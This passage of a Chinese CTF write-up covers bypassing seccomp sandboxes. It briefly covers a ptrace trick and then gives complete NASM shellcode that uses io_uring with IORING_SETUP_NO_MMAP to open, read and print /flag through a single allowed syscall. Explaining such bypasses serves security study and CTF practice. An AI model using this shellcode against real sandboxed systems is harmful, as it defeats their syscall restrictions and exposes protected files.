## ptrace

这里只提供一种思路：在没有禁用 ptrace 的情况下，在早期版本的 kernel 中可以用 fork 等系统调用另起一个进程，借助父进程 ptrace 子进程，当监测到子进程发生某个系统调用时，捕获该行为并修改系统调用号实现 seccomp 等绕过，github 上有开源的 poc 代码 [4]。

经过在 linux 源码仓库中的分析，可以定位到该问题在 `commit-58d0a862f573c3354fa912603ef5a4db188774e7` 中被披露，在 2016 年 6 月 15 号的一系列 commit 中被修复：`ptrace: run seccomp after ptrace`。

## io_uring

`io_uring` 的绕过和此前利用 fsmount 绕过对 mount 系统调用的禁用一样，并不是一个 linux 的 bug，而是编写 seccomp 黑名单规则时忽略了新版本加入的系统调用，借助 io_uring，可以只用一个系统调用完成上述的 orw（open、read、write）操作 [5]，这是此前版本中难以实现的事情。

在如下沙箱规则中，只允许 `io_uring_setup` 系统调用：

```nasm
void sandbox() {
    struct sock_filter filter[] = {
        BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 4),
        BPF_JUMP(BPF_JMP + BPF_JEQ, 0xc000003e, 0, 3),
        BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0),
        BPF_JUMP(BPF_JMP + BPF_JGE, 0x40000000, 1, 0),
        BPF_JUMP(BPF_JMP + BPF_JEQ, 0x1a9, 1, 0),
        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),
        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
    };
    struct sock_fprog prog = {
        .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
        .filter = filter,
    };
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
}
```

先了解一下 `io_uring`**，**是 Linux 内核提供的一种高效的异步 I/O 操作接口，旨在减少系统调用的开销并提供更高的 I/O 性能。SQE 是其中重要的概念，即提交队列元素。而在 linux 内核版本 6.5 之后，`io_uring_setup` 系统调用增加了 `IORING_SETUP_NO_MMAP` flag，这使得单独一个系统调用完成 open+read+write（还可以支持 socket）成为可能：

```nasm
	[BITS 64]

	struc    io_uring_params
	sq_entries resd 1
	cq_entries resd 1
	io_uring_params_flags  resd 1
	sq_thread_cpu resd 1
	sq_thread_idle resd 1
	features resd 1
	wq_fd resd 1
	io_uring_params_resv resd 3
	;        struct io_sqring_offsets
	sqoff_head resd 1
	sqoff_tail resd 1
	sqoff_ring_mask resd 1
	sqoff_ring_entries resd 1
	sqoff_flags resd 1
	sqoff_dropped resd 1
	sqoff_array resd 1
	sqoff_resv1 resd 1
	sqoff_user_addr resq 1
	;        struct io_cqring_offsets
	cqoff_head resd 1
	cqoff_tail resd 1
	cqoff_ring_mask resd 1
	cqoff_ring_entries resd 1
	cqoff_flags resd 1
	cqoff_dropped resd 1
	cqoff_array resd 1
	cqoff_resv1 resd 1
	cqoff_user_addr resq 1
	endstruc

	struc io_uring_sqe
	sqe_opcode resb 1
	sqe_flags resb 1
	sqe_ioprio resw 1
	sqe_fd resd 1
	sqe_off resq 1
	sqe_addr resq 1
	sqe_len resd 1
	sqe_axu_flags resd 1
	sqe_user_data resq 1
	sqe_buf_index resw 1
	sqe_personality resw 1
	sqe_file_index resd 1
	sqe_pad2 resq 2
	endstruc

	%define __x64_sys_io_uring_setup       0x1a9
	%macro  io_uring_setup 2; (u32, entries, struct io_uring_params __user *, params)
	push    __x64_sys_io_uring_setup
	pop     rax
	push    %1
	pop     rdi
	push    %2
	pop     rsi
	syscall
	%endmacro

	%define DEPTH                   (0x10)
	%define IORING_SETUP_NO_MMAP (1 << 14)
	%define IORING_SETUP_SQPOLL (1 << 1)
	%define IORING_OP_OPENAT        (18)
	%define IORING_OP_READ          (22)
	%define IORING_OP_SOCKET        (45)
	%define IORING_OP_CONNECT       (16)
	%define IORING_OP_WRITE         (23)

	global  _start
	section .text

	%define base rbp

_start:
	;   Setup base for locatation
	mov base, rbx
	lea rsi, [base + uring_params]
	;   Setup sq_ring and sqe_ring
	mov dword [rsi + sqoff_user_addr], 0xc0d3000 + 0x1000; rings
	mov dword [rsi + cqoff_user_addr], 0xc0d3000 + 0x2000; sq_sqes
	mov dword [rsi + sq_thread_idle], 2000000; sq_thread_idle
	mov dword [rsi + io_uring_params_flags], IORING_SETUP_NO_MMAP | IORING_SETUP_SQPOLL; flags

	;   Save sq_ring
	mov dword [base + sq_ring], 0xc0d3000 + 0x2000
	;   Save sqe_ring
	mov dword [base + sqe_ring], 0xc0d3000 + 0x1000

	;   Setup sq_array
	mov rax, [base + sq_ring]
	mov rbx, 0x40 + DEPTH * 2 * 0x10
	add rax, rbx
	mov rcx, 0

loop_set:
	mov [rax], rcx
	add rcx, 0x1
	add rax, 0x4
	cmp rcx, DEPTH
	jb  loop_set

	;   SQE 1: open("/flag")
	mov rax, [base + sqe_ring]
	;   add rax, 0x40
	mov rbx, (-100 << 32) | (0x0000 << 16) | (0x04 << 8) | IORING_OP_OPENAT
	mov qword [rax], rbx
	lea rbx, [base + flag_name]
	;   sqe_addr: file to open / sqe_len: open_mode / sqe_axu_flags: open_flags
	mov qword [rax + sqe_addr], rbx

	;   SQE 2: read(4, flag_data, 0x100)
	add rax, 0x40
	mov rbx, (4 << 32) | (0x0000 << 16) | (0x04 << 8) | IORING_OP_READ
	mov qword [rax], rbx
	lea rbx, [base + flag_data]
	;   sqe_addr:
	mov qword [rax + sqe_addr], rbx
	mov qword [rax + sqe_len], 0x100

	;   SQE 4 : write(1, flag_data, 0x100)         fd | prio | flags | opcode
	add rax, 0x40
	mov rbx, (1 << 32) | (0x0000 << 16) | (0x00 << 8) | IORING_OP_WRITE
	mov qword [rax], rbx
	lea rbx, [base + flag_data]
	;   sqe_addr:
	mov qword [rax + sqe_addr], rbx
	mov qword [rax + sqe_len], 0x100

	;   update sq_ring -> tail
	mov rax, [base + sq_ring]
	;   mov rbx, [base + uring_params + sqoff_tail]
	mov rbx, 4
	add rax, rbx
	mov dword [rax], 5

	;   Save io_uring fd
	io_uring_setup DEPTH, rsi
	mov [base + ring_fd], rax

	jmp $

	flag_name db "/flag", 0
	ring_fd    dd 0
	sq_ring     dq 0
	sqe_ring    dq 0
	dq 0

uring_params:
	istruc io_uring_params
	iend

flag_data:

```

使用 nasm -f bin 来生成二进制程序注入目标程序完成利用。

# References

1. [ALPHA3: Alphanumeric shellcode encoder . _SkyLined_](https://github.com/SkyLined/alpha3)

2. [仅用三种字符实现 x86*64 架构的任意 shellcode . \_loop*](https://www.anquanke.com/post/id/256530)

3. [PoC for bypassing seccomp if ptrace is allowed . _thejh_](https://gist.github.com/thejh/8346f47e359adecd1d53)

4. [JQCTF-2023: from1toN . _N1ghtu_](https://github.com/Nu1LCTF/jqctf2023/tree/main/pwn/from1toN)
